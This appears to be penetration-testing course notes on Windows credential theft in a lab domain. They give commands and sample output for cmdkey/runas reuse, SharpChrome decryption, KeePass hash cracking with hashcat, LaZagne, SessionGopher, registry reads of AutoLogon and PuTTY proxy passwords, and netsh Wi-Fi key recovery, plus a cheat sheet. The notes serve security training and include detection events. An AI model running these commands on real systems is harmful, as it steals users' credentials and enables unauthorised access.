# Further Credential Theft on Windows

## Table of Contents
1. [Big Idea: Beyond Just Searching Files](#1-big-idea-beyond-just-searching-files)
2. [Cmdkey Saved Credentials](#2-cmdkey-saved-credentials)
3. [Browser Credentials](#3-browser-credentials)
4. [Password Managers (e.g., KeePass)](#4-password-managers-eg-keepass)
5. [Email Searching](#5-email-searching)
6. [All-in-One Credential Tools: LaZagne](#6-all-in-one-credential-tools-lazagne)
7. [Saved Remote-Access Sessions: SessionGopher](#7-saved-remote-access-sessions-sessiongopher)
8. [Clear-Text Passwords in the Registry](#8-clear-text-passwords-in-the-registry)
9. [Wi-Fi Passwords](#9-wi-fi-passwords)
10. [Choosing a Technique — Decision Flow](#10-choosing-a-technique--decision-flow)
11. [Cheat Sheet](#11-cheat-sheet)
12. [Big-Picture Takeaways](#12-big-picture-takeaways)

---

## 1. Big Idea: Beyond Just Searching Files

Not every leaked credential is sitting in a plain text file waiting to be found with a keyword search. Windows and the software running on it have many built-in "convenience" features — saved logins, auto-connect settings, remembered Wi-Fi networks — that quietly store usernames and passwords behind the scenes. This document covers techniques for pulling credentials out of those less obvious places: saved system credentials, browsers, password managers, email, and specialized extraction tools.

Think of this as moving from "checking under the doormat" (the previous set of notes) to "checking the smart lock's memory, the car's garage-door remote, and the voicemail system" — places that store access information automatically, without you ever writing anything down yourself.

---

## 2. Cmdkey Saved Credentials

### What It Is
`cmdkey` is a built-in Windows command for creating, listing, and deleting **saved credentials** — stored username/password pairs tied to a specific remote computer or service. People commonly use this so Windows can automatically log them into a **Remote Desktop (RDP)** session (a feature that lets you remotely control another Windows machine's desktop) without retyping a password every time.

### Listing What's Saved
```
C:\evilcorp> cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: evilcorp\bob
```
This output tells us that a saved credential exists for user `evilcorp\bob`, meant for connecting via Terminal Services (`TERMSRV`) to a host called `SQL01`.

### Why It Matters
If you connect via RDP to `SQL01` from this machine, Windows will silently reuse Bob's saved credential — meaning you're effectively "borrowing" his access without ever seeing his actual password. This can help you **move laterally** (jump to a different machine using a different account) or **escalate privileges** (gain higher access on the current machine).

### Reusing the Credential via `runas`
`runas` lets you launch a program as a different user. With `/savecred`, it reuses credentials cmdkey already has stored, rather than prompting for a password:

```
PS C:\evilcorp> runas /savecred /user:evilcorp\bob "COMMAND HERE"
```
This could be used to get a reverse shell (a connection that lets you remotely control the target) as Bob, run another program as Bob, or open a PowerShell/CMD window running as Bob — all without ever knowing his actual password.

---

## 3. Browser Credentials

### The Idea
People frequently let their browser "remember" passwords for sites they visit often. Chrome and other Chromium-based browsers (edge, Brave, etc. share the same underlying engine) store these saved logins encrypted on disk, but tools exist that can decrypt them if you have access to the right user account.

### Example: SharpChrome
[SharpChrome](https://github.com/GhostPack/SharpDPAPI) is a tool specifically built to extract and decrypt Chrome's saved cookies and logins.

```
PS C:\evilcorp> .\SharpChrome.exe logins /unprotect

[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.evilcorp.local/,https://vc01.evilcorp.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@evilcorp.local,Welcome1
```
Walking through this:
- `/unprotect` tells SharpChrome to actually decrypt the data (rather than just showing it in its still-encrypted form).
- Chrome keeps an **AES key** (a symmetric encryption key — the same key both locks and unlocks the data) in a file called `Local State`. SharpChrome reads and uses this key to unlock the saved logins.
- The final line is the payoff: a real saved username (`bob@evilcorp.local`) and password (`Welcome1`) for a site (`vc01.evilcorp.local`), pulled straight out of Chrome's `Login Data` file.

### A Note on Getting Caught
Pulling credentials out of a Chromium browser isn't invisible — it tends to leave traces that a defensive security team ("blue team," the people who monitor for and respond to attacks) can spot in Windows event logs:

| Event ID | What It Represents |
|----------|---------------------|
| 4688 | A new process was created (i.e., SharpChrome itself running) |
| 16385 | DPAPI activity (the AES key being unlocked/used) |
| 4662 | Object access (a monitored object — like a registry key — was accessed) |
| 4663 | File access (a specific file, like `Login Data`, was opened) |

Being aware of this is useful both offensively (knowing what you might trigger) and defensively (knowing what to monitor for).

---

## 4. Password Managers (e.g., KeePass)

### Why Password Managers Are High-Value Targets
Companies often issue password managers to staff — anything from a local desktop app (**KeePass**), to a cloud service (**1Password**), to an enterprise-grade vault (**Thycotic**, **CyberArk**). If you can get into one — especially one belonging to IT staff — you may unlock credentials for many other high-value systems at once (servers, databases, network devices). Think of it like finding the master keyring a building superintendent carries, instead of a single door key.

Access to a vault is sometimes gained through **password reuse** (someone used the same password for their vault as for something else that's already been compromised) or simply guessing a weak master password.

### Finding and Cracking a KeePass Database
KeePass databases are saved locally as `.kdbx` files, typically protected by just one master password.

**Step 1 — Extract a crackable hash from the file** using `keepass2john` (a script that converts various file formats into a format password-cracking tools understand):
```
$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```
This long string isn't the password itself — it's a mathematically derived "fingerprint" of the master password, in a format tools like Hashcat know how to work with.

**Step 2 — Crack the hash offline** using **Hashcat** (a GPU-accelerated password-cracking tool) with mode `13400`, which specifically targets KeePass hashes:
```
$ hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```
`rockyou.txt` is a very common wordlist (list of candidate passwords) made of real passwords leaked in past breaches — Hashcat tries each one against the hash until (if you're lucky) it finds a match.

If this succeeds, you've essentially unlocked the entire password vault.

---

## 5. Email Searching

If you have access to a domain-joined machine (a computer that's a registered member of the Active Directory domain) as a domain user with a Microsoft Exchange mailbox, you can search that mailbox for sensitive keywords. [MailSniper](https://github.com/dafthack/MailSniper) is a tool built for exactly this — searching for terms like "pass," "creds," or "credentials" across a user's email, since people frequently email passwords to themselves or coworkers "just this once."

---

## 6. All-in-One Credential Tools: LaZagne

### What It Does
[LaZagne](https://github.com/AlessandroZ/LaZagne) is a broad-spectrum credential-harvesting tool — rather than targeting one app, it checks dozens of categories at once: browsers, chat clients, databases, email clients, memory dumps, sysadmin tools, and Windows' own internal credential stores (Autologon, Credential Manager, DPAPI, LSA secrets, etc.). You can run every module at once, just one category, or target one specific piece of software (e.g., just OpenVPN).

### Viewing Available Modules
```
PS C:\evilcorp> .\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                   ...
positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               Run chats module
    mails               Run mails module
    all                 Run all modules
    git                 Run git module
    svn                 Run svn module
    windows             Run windows module
    wifi                Run wifi module
    maven               Run maven module
    sysadmin            Run sysadmin module
    browsers            Run browsers module
    games               Run games module
    multimedia          Run multimedia module
    memory              Run memory module
    databases           Run databases module
    php                 Run php module

optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version
```

### Running Every Module
```
PS C:\evilcorp> .\lazagne.exe all

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.evilcorp.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.evilcorp.local
Login: jordan_adm
Password: ! Q A Z z a q 1

[+] 2 passwords have been found.

For more information launch it again with the -v option

elapsed time = 5.50499987602
```
Here LaZagne found two separate credentials for user `jordan`: one saved by **WinSCP** (an SFTP/SCP file-transfer client) for `transfer.evilcorp.local`, and one saved in **Credential Manager** ("Credman," Windows' built-in vault for saved logins) for `dev01.dev.evilcorp.local`. Both were being stored in a way that let LaZagne pull them back out in plain text — illustrating that many applications, despite appearances, do not store saved credentials securely.

---

## 7. Saved Remote-Access Sessions: SessionGopher

### What It Does
[SessionGopher](https://github.com/Arvanaghi/SessionGopher) is a PowerShell tool that hunts down and decrypts saved session information for common remote-access tools: **PuTTY** (SSH client), **WinSCP** (file transfer), **FileZilla** (FTP client), **SuperPuTTY** (a PuTTY session manager), and **RDP**. It works by searching the `HKEY_USERS` registry hive — the part of the Windows registry that stores per-user settings for every user who has ever logged into the machine — and decrypting whatever saved login details it finds there. It can also look for related files like PuTTY private keys (`.ppk`), RDP connection files (`.rdp`), and RSA token files (`.sdtid`).

> **Note:** Pulling saved sessions for *every* user on the box requires local administrator rights (since you need to read other users' registry hives). Running it as your own current user, however, requires no special privileges and is always worth trying.

### Example Run
```
PS C:\evilcorp> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
 
Source   : WINLPE-SRV01\john
Session  : Default%20Settings
Hostname :
Username :
Password :
 
 
PuTTY Sessions
 
 
Source   : WINLPE-SRV01\john
Session  : nix03
Hostname : nix03.evilcorp.local
 

 
SuperPuTTY Sessions
 
 
Source        : WINLPE-SRV01\john
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.evilcorp.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings
```
This particular run didn't turn up a plaintext password, but it *did* reveal a useful username (`srvadmin`) tied to a specific host (`nix03.evilcorp.local`) via a saved SuperPuTTY session — useful reconnaissance even without a password in hand.

---

## 8. Clear-Text Passwords in the Registry

The Windows **registry** is a large hierarchical database that stores configuration settings for the operating system and installed applications. Certain features store plaintext passwords directly inside it — something worth checking manually, not just relying on automated tools like LaZagne or SessionGopher.

### Windows AutoLogon
**AutoLogon** is a feature that automatically signs a user into Windows at startup, skipping the login prompt entirely. It's popular on single-user machines where convenience is valued over security. The catch: enabling it stores the username and password in the registry in **plain text**.

Relevant registry location (readable by standard, non-admin users):
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

| Registry Value | Meaning |
|------|---------|
| `AutoAdminLogon` | Whether AutoLogon is turned on (`1` = enabled) |
| `DefaultUserName` | The username that gets logged in automatically |
| `DefaultPassword` | That user's password, stored in plain text |

### Checking It with `reg.exe`
`reg query` reads values out of the registry from the command line.
```
C:\evilcorp>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    john
    DefaultPassword    REG_SZ    P@ssword1!
```
`AutoAdminLogon` is set to `1` (enabled), and right below it sit the plaintext username (`john`) and password (`P@ssword1!`) — no decryption needed at all.

> **Note:** If AutoLogon genuinely must be configured on a system, Microsoft's own **Autologon.exe** tool (part of the Sysinternals suite) is the safer option, since it stores the password as an **LSA secret** (an internal Windows mechanism that encrypts certain sensitive values) instead of in plain text.

### PuTTY Saved Sessions
When a PuTTY session is configured to use a **proxy connection** and the session is saved, the proxy credentials get written to the registry in plain text, under:
```
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```
Since this lives under `HKEY_CURRENT_USER` (settings specific to the currently logged-in user, as opposed to `HKEY_LOCAL_MACHINE` which applies machine-wide), you normally need to be logged in as that specific user to see it directly — unless you have admin rights, in which case you can find the same data under that user's hive inside `HKEY_USERS`.

**Step 1 — List saved sessions:**
```
PS C:\evilcorp> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

**Step 2 — Inspect that session's settings:**
```
PS C:\evilcorp> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!
```
This is a classic mistake: an IT administrator configured this proxy connection using their own **admin account** credentials, which then got saved in plain text as part of the session. Anyone who can read this registry key now has a domain admin-style password that was probably never meant to be exposed this way — and could try reusing it elsewhere on the network.

---

## 9. Wi-Fi Passwords

### Listing Remembered Wireless Networks
If you have local admin access to a workstation with a Wi-Fi adapter, `netsh` (Windows' built-in network configuration tool) can list every wireless network profile the machine remembers connecting to:
```
C:\evilcorp> netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

### Revealing the Actual Password
Adding `key=clear` to the same command reveals the saved pre-shared key (the Wi-Fi password) for a specific network, if the network's configuration allows it:
```
C:\evilcorp> netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```
The `Key Content` line at the bottom is the actual Wi-Fi password (`ILFREIGHTWIFI-CORP123908!`) for the `ilfreight_corp` network, retrieved in plain text. While it's uncommon to need this during an engagement, it could let you pivot onto a separate wireless network and reach additional resources from there.

---

## 10. Choosing a Technique — Decision Flow

```
              What do you have access to on the target?
                              |
        -------------------------------------------------------
        |              |                |               |
  A saved RDP/   A browser with   A .kdbx /        A user's registry
  service login   saved logins    password-vault    (AutoLogon, PuTTY
  (cmdkey)                        file               sessions, etc.)
        |              |                |               |
   cmdkey /list    SharpChrome     keepass2john    reg query
   + runas          logins          + Hashcat        (manual check)
   /savecred        /unprotect      -m 13400
        |              |                |               |
        -------------------------------------------------------
                              |
                No idea what apps are in use at all?
                              |
                 Run a broad-spectrum tool:
                 LaZagne (local creds) /
                 SessionGopher (remote sessions) /
                 MailSniper (email)
```

---

## 11. Cheat Sheet

| Goal | Command / Tool |
|------|-----------------|
| List saved Windows credentials | `cmdkey /list` |
| Run a command as a user with a saved credential | `runas /savecred /user:domain\user "COMMAND"` |
| Dump decrypted Chrome logins | `SharpChrome.exe logins /unprotect` |
| Extract a crackable hash from a KeePass file | `python2.7 keepass2john.py file.kdbx` |
| Crack a KeePass hash | `hashcat -m 13400 keepass_hash wordlist.txt` |
| Search a user's email for sensitive terms | MailSniper |
| Run every LaZagne credential module | `lazagne.exe all` |
| Pull saved PuTTY/WinSCP/RDP sessions for current user | `Invoke-SessionGopher -Target <hostname>` |
| Check for plaintext AutoLogon creds | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
| List saved PuTTY sessions | `reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions` |
| Reveal a saved PuTTY session's proxy creds | `reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<name>` |
| List remembered Wi-Fi networks | `netsh wlan show profile` |
| Reveal a saved Wi-Fi password | `netsh wlan show profile <name> key=clear` |

---

## 12. Big-Picture Takeaways

1. Convenience features — saved RDP logins, AutoLogon, remembered Wi-Fi, saved browser passwords — exist to make life easier for legitimate users, but they double as ready-made credential stashes for anyone who gets local access.
2. Decryption isn't always necessary: AutoLogon and saved PuTTY proxy settings store passwords in **plain text** directly in the registry, no cracking required.
3. Where encryption *is* used (browser logins, KeePass databases), dedicated tools exist to either decrypt it directly (SharpChrome) or extract a crackable hash for offline password cracking (keepass2john + Hashcat).
4. Broad-spectrum tools like **LaZagne** and **SessionGopher** are efficient first passes that check dozens of applications at once, but understanding the manual registry/file locations behind them lets you verify results, catch what they miss, and operate when you can't run third-party tools.
5. Credential-hunting actions aren't invisible — browser credential theft, for example, tends to generate specific, loggable Windows events, which matters both for staying stealthy and for understanding what a defensive team might detect.
6. A recurring theme across both this document and the previous one: administrators reusing their own high-privilege credentials in "lesser" tools (a PuTTY proxy, a saved RDP session) is one of the most common ways attackers end up with admin-level access.
